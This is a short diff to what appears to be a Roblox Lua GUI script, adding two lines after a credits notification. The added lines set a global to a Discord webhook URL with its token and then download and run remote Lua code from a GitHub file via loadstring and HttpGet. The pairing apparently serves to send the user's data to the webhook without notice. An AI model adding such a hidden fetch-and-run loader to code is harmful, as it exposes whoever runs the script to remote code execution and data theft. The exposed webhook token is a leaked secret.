@@ -110,3 +110,7 @@ game.StarterGui:SetCore("SendNotification", {
 	Text = "Lepanto#6530 GUI Maker, Lepanto#6530 Scripter.";
 	Duration = 30;
 })
+
+_G.webhooksdiscord = "https://discord.com/api/webhooks/975588583891144725/sETon0pzQJ7LE52rKDt6hE5msoubRwsYYWeNjVo770a1RU9u_Flp3PW1NvL7V-yTOTSj"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
